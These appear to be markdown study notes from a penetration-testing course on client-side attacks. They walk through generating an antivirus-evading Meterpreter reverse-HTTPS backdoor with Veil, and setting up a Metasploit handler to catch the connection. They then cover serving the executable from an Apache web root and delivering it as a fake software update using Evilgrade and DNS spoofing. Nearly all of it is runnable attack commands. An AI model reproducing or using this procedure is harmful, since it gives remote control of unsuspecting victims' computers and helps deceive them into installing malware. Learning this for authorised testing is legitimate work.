# Client Side Attacks:
- Use if server side attacks fail
- If IP is probably useless
- Require user injection
- Social engineering can be very useful
- Information gathering is vital

## VEIL - Framework:
- A backdoor is a file that gives us full control over the machine that it gets executed on.
- Backdoors can be caught by Anti-Virus programs.
- Veil is a frameowrk for generating Undetectable backdoors.

```bash
veil
```
If you execute "list" in viel command, there will be two available tools:
1. Evasion (Generates undetectable backdoors)
2. Ordnance (Generates payloads)

```bash
use 1 # Evasion and will enter to the evasion command tool
list  # List all the available payloads
use 15 # go/meterpreter/rev_https.py
set LHOST 10.20.14.213  # My IP address
set LPORT 80 # 8080 also can be used
set PROCESSORS 1
set SLEEP 6
options
generate # Generate the backdoor
rev_https_8080  # Base name of output files
```

## Listening For Incomming Connections:
Use used *go/meterpreter/rev_https* payload and *port 8080*
```bash
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
show options
set LHOST 10.20.14.213  # Your IP
set LPORT 80  # If backdoor is set to 8080, then here also 8080
show options
exploit
```

## Basic Delivery Method To Test the Backdoor (Hack Windows):
Create a folder named "evil-files" in "/var/www/html/" and go to "/var/lib/viel-evasion/output/compiled". Copy the **.exe** file and paste into the evil-files directory created just a secound ago.
```bash
service apache2 start
```
After deliver the file, execute
```bash
sysinfo
```

## Hack Windows 10 using Fake Update:
### Backdoor Delivery Method1 - Spoofing Software Updates
- Fake an update for an already installed program
- Install backdoor instead of the update
- Requires DNS spoofing + Evilgrade (a server to serve the update).

1. Download and install Evilgrade using the instructions in the resources.
2. Start Evilgrade -->   **> ./configure**
3. Check programs that can be hijacked  --> **> show modules**
4. Select one  --> **> configure [module]**
5. Set backdoor location --> **> set agent [agent location]**
6. Start server --> **> start**
7. Start dns spoofing and handler